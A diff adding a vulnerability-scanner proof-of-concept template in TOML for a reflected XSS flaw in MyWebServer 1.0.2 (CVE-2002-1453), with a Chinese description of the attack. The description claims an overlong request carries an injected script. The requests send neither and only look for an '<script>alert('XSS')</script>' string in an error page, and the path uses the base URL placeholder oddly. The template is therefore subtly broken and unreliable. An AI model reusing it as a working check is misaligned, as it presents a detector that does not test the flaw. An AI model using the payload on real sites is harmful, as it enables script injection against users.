@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "MyWebServer 1.0.2 存在 XSS 漏洞，攻击者可通过发送超长 HTTP 请求并在其后附加恶意脚本，注入 JavaScript 到服务器返回的错误消息中，从而在受害者浏览器中执行恶意代码。"
+id = "POC-AVE-2002-0594"
+name = "MyWebServer 1.0.2 XSS 漏洞 PoC"
+severity = "medium"
+tags = ["ave-2002-0594"]
+vuln_id = [
+    "CVE-2002-1453",
+    "AVE-2002-0594",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/long-request"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/error-page"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
